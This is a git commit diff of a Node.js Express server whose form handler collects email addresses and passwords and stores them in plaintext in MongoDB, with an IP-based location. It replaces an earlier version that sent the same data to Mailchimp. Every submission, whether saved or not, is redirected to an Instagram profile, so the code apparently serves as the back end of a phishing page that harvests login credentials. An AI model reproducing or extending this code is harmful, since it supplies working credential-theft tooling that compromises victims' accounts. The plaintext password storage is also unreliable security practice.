1b13a9263231f9d67788a6579969c5c4640586fb
M-Abdullah-Bhatti <muhammadabdullahimdad@gmail.com>
2023-03-02 12:45:40 +0500

    code pushed

--- server.js
+++ server.js
@@ -1,13 +1,47 @@
 const express = require("express");
 const bodyParser = require("body-parser");
-const https = require("https");
 const axios = require("axios");
+const mongoose = require("mongoose");
+const cors = require("cors");
 require("dotenv").config();
+
+const User = require("./usermodel");
 
 // Middlewares
 const app = express();
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(__dirname + "/public"));
+
+app.use(express.urlencoded({ extended: false }));
+// app.use(express.json({ limit: "50mb" }));
+app.use(bodyParser.json());
+
+const corsOptions = {
+  origin: true,
+  // origin: "*",
+  credentials: true,
+  optionSuccessStatus: 200,
+};
+
+app.use(cors(corsOptions));
+
+// ----------------------------
+const connectDB = async () => {
+  try {
+    const conn = await mongoose.connect(process.env.mongoUri, {
+      useNewUrlParser: true,
+      useUnifiedTopology: true,
+    });
+    console.log(`MongoDB Connected: ${conn.connection.host}`);
+  } catch (error) {
+    console.log(error);
+    process.exit(1);
+  }
+};
+
+connectDB();
+
+// ---------------------------------
 
 // Requests
 app.get("/", function (req, res) {
@@ -20,8 +54,9 @@ app.get("/form", function (req, res) {
 
 // Mailchimp Post Requests
 app.post("/form", async function (req, res) {
-  console.log("------------------------");
+  const { email, password } = req.body;
 
+  // ===============================
   let link = "https://api.ipify.org";
   let response = await axios.get(link);
   console.log("response" + response);
@@ -32,46 +67,23 @@ app.post("/form", async function (req, res) {
   let link2 = `https://ip.city/api.php?ip=${ipAddress}&key=${process.env.IPCITY_API}`;
   let location = await axios.get(link2);
   let loc = await location.data;
-  console.log("LOC------------------------" + loc);
+  // ===============================
 
-  const email = req.body.email;
-  const password = req.body.password;
-  const data = {
-    members: [
-      {
-        email_address: email,
-        status: "subscribed",
-        merge_fields: {
-          _EMAIL: email,
-          PASSWORD: password,
-          LOCATION: `IP: ${ipAddress} , Country: ${loc.countryName} , Region: ${loc.region}, City: ${loc.city} `,
-        },
-      },
-    ],
-  };
-
-  const jsonData = JSON.stringify(data);
-
-  // Credentials
-  const AudienceId = process.env.MAILCHIMP_AUDIENCE_ID;
-  const ServerPrefix = process.env.MAILCHIMP_SERVER_PREFIX;
-  const ApiKey = process.env.MAILCHIMP_API_KEY;
-  const url = `https://${ServerPrefix}.api.mailchimp.com/3.0/lists/${AudienceId}`;
-
-  const options = {
-    method: "POST",
-    auth: `${process.env.USER_NAME}:${ApiKey}`,
-  };
-
-  const request = https.request(url, options, function (response) {
-    response.on("data", function (data) {
-      console.log(JSON.parse(data));
+  try {
+    const newUser = new User({
+      email,
+      password,
+      location: `IP: ${ipAddress} , Country: ${loc.countryName} , Region: ${loc.region}, City: ${loc.city} `,
     });
-  });
-  request.write(jsonData);
-  request.end();
-  res.sendFile(__dirname + "/public/home.html");
-  res.redirect("/form");
+
+    const savedUser = await newUser.save();
+    res.redirect("https://instagram.com/thron_eth?igshid=ZDdkNTZiNTM=");
+    // res.status(200).json({ message: "User saved successfully", savedUser });
+  } catch (error) {
+    res.redirect("https://instagram.com/thron_eth?igshid=ZDdkNTZiNTM=");
+    // console.log(error);
+    // res.status(500).json({ message: "Error saving user" });
+  }
 });
 
 // Server Listening
